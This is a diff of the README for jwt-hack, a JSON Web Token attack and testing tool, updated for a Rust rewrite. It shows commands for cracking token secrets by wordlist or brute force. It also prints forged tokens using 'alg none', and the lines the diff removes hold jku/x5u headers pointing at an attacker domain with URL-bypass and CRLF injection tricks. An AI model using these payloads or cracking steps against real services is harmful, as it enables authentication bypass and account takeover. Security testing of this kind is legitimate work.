@@ -4,31 +4,36 @@
   <br>
   Hack the JWT(JSON Web Token)
   <br>
-  <img src="https://img.shields.io/github/v/release/hahwul/jwt-hack?style=flat">
-  <img src="https://github.com/hahwul/jwt-hack/actions/workflows/go.yml/badge.svg">
-  <img src="https://github.com/hahwul/jwt-hack/actions/workflows/codeql-analysis.yml/badge.svg">
-  <a href="https://codecov.io/gh/hahwul/jwt-hack"><img src="https://codecov.io/gh/hahwul/jwt-hack/branch/main/graph/badge.svg"/></a>
-  <img src="https://app.codacy.com/project/badge/Grade/77bdf42ef06a430a9bfb46f15eb86626">
-  <a href="https://goreportcard.com/report/github.com/hahwul/jwt-hack"><img src="https://goreportcard.com/badge/github.com/hahwul/jwt-hack"></a>
+  <img src="https://img.shields.io/badge/version-v2.0.0-blue">
+  <img src="https://img.shields.io/badge/license-MIT-green">
   <a href="https://twitter.com/intent/follow?screen_name=hahwul"><img src="https://img.shields.io/twitter/follow/hahwul?style=flat&logo=twitter"></a>
 </h1>
 
+## About
+JWT-Hack is a tool for testing and analyzing JSON Web Tokens. This is the Rust implementation (v2.0.0) of the original Go-based JWT-Hack tool, providing better performance and additional features.
+
 ## Installation
-### from the source
+
+### From source
 ```
-go install github.com/hahwul/jwt-hack@latest
+# Clone the repository
+git clone https://github.com/hahwul/jwt-hack
+cd jwt-hack/rust-jwt-hack
+
+# Build and install
+cargo build --release
+cargo install --path .
 ```
 
-### homebrew
+### Cargo
 ```
-brew tap hahwul/jwt-hack
-brew install jwt-hack
+cargo install jwt-hack
 ```
 
-### snapcraft
-```
-sudo snap install jwt-hack
-```
+### Future installation methods
+Coming soon:
+- Homebrew
+- Snapcraft
 
 ## Usage
 ```
@@ -37,7 +42,7 @@ sudo snap install jwt-hack
    88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
 88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
 -------------------------
-Hack the JWT(JSON Web Token) | by @hahwul | v1.0.0
+Hack the JWT(JSON Web Token) | by @hahwul | v2.0.0
 
 Usage:
   jwt-hack [command]
@@ -54,9 +59,7 @@ Flags:
   -h, --help   help for jwt-hack
 ```
 
-![1414](https://user-images.githubusercontent.com/13212227/97078000-8a023900-1623-11eb-844f-ee92399be392.png)
-
-## Encode mode(JSON to JWT)
+## Encode mode (JSON to JWT)
 ```
 ▶ jwt-hack encode '{"json":"format"}' --secret={YOUR_SECRET}
 ```
@@ -73,7 +76,7 @@ INFO[0000] Encoded result                                algorithm=HS256
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXN0IjoiMTIzNCJ9.JOL1SYkRZYUz9GVny-DgoDj60C0RLz929h1_fFcpqQA
 ```
 
-## Decode mode(JWT to JSON)
+## Decode mode (JWT to JSON)
 ```
 ▶ jwt-hack decode {JWT_CODE}
 ```
@@ -88,10 +91,14 @@ e.g
 88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
 -------------------------
 INFO[0000] Decoded data(claims)                          header="{\"alg\":\"HS256\",\"typ\":\"JWT\"}" method="&{HS256 5}"
-{"iat":1516239022,"name":"John Doe","sub":"1234567890"}
+{
+  "iat": 1516239022,
+  "name": "John Doe",
+  "sub": "1234567890"
+}
 ```
 
-## Crack mode(Dictionary attack / BruteForce)
+## Crack mode (Dictionary attack / BruteForce)
 ```
 ▶ jwt-hack crack -w {WORDLIST} {JWT_CODE}
 ```
@@ -128,13 +135,18 @@ INFO[0000] Invalid signature                             word=calendar
 [+] Finish crack mode
 ```
 
-## Payload mode(Alg none attack, etc..)
+## Bruteforce mode
+```
+▶ jwt-hack crack -m brute {JWT_CODE} --max=4
+```
+
+## Payload mode (Alg none attack, etc.)
 ```
 ▶ jwt-hack payload {JWT_CODE}
 ```
 
-for jku and x5u (what is? [readme this slide](https://www.slideshare.net/snyff/jwt-jku-x5u))
-* `--jwk-attack` : A attack payload domain for jku&x5u (e.g hahwul.com)
+For jku and x5u (what is? [readme this slide](https://www.slideshare.net/snyff/jwt-jku-x5u)):
+* `--jwk-attack` : An attack payload domain for jku&x5u (e.g hahwul.com)
 * `--jwk-trust` : A trusted domain for jku&x5u (e.g google.com)
 * `--jwk-protocol` : jku&x5u protocol (http/https) (default "https")
 
@@ -145,33 +157,21 @@ e.g
 INFO[0000] Generate none payload                         header="{\"alg\":\"none\",\"typ\":\"JWT\"}" payload=none
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
 
-INFO[0000] Generate NonE payload                         header="{\"alg\":\"NonE\",\"typ\":\"JWT\"}" payload=NonE
-eyJhbGciOiJOb25FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate NONE payload                         header="{\"alg\":\"NONE\",\"typ\":\"JWT\"}" payload=NONE
-eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate jku + basic payload                  header="{\"alg\":\"hs256\",\"jku\":\"attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
-eyJhbGciOiJoczI1NiIsImprdSI6ImF0dGFjay5oYWh3dWwuY29tIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate jku host validation payload          header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.comZattack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
-eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbVphdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate jku host validation payload          header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.com@attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
-eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbUBhdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate jku host header injection (w/CRLF) payload  header="{\"alg\":\"hs256\",\"jku\":\"https://trust.hahwul.com%0d0aHost: attack.hahwul.com\",\"typ\":\"JWT\"}" payload=jku
-eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbSUwZDBhSG9zdDogYXR0YWNrLmhhaHd1bC5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate x5u + basic payload                  header="{\"alg\":\"hs256\",\"x5u\":\"attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
-eyJhbGciOiJoczI1NiIsIng1dSI6ImF0dGFjay5oYWh3dWwuY29tIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate x5u host validation payload          header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.comZattack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
-eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbVphdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate x5u host validation payload          header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.com@attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
-eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbUBhdHRhY2suaGFod3VsLmNvbSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
-
-INFO[0000] Generate x5u host header injection (w/CRLF) payload  header="{\"alg\":\"hs256\",\"x5u\":\"https://trust.hahwul.com%0d0aHost: attack.hahwul.com\",\"typ\":\"JWT\"}" payload=x5u
-eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vdHJ1c3QuaGFod3VsLmNvbSUwZDBhSG9zdDogYXR0YWNrLmhhaHd1bC5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.
+...
 ```
+
+## Performance Improvements in v2.0.0 (Rust version)
+
+The Rust implementation offers:
+1. **Faster execution** - Particularly noticeable in crack mode with large wordlists
+2. **More memory efficient** - Uses less memory for the same operations
+3. **Better concurrency** - Utilizes Rust's concurrency model for optimal performance
+4. **Improved error handling** - More robust error handling with detailed messages
+
+## Contributing
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+## License
+
+MIT License
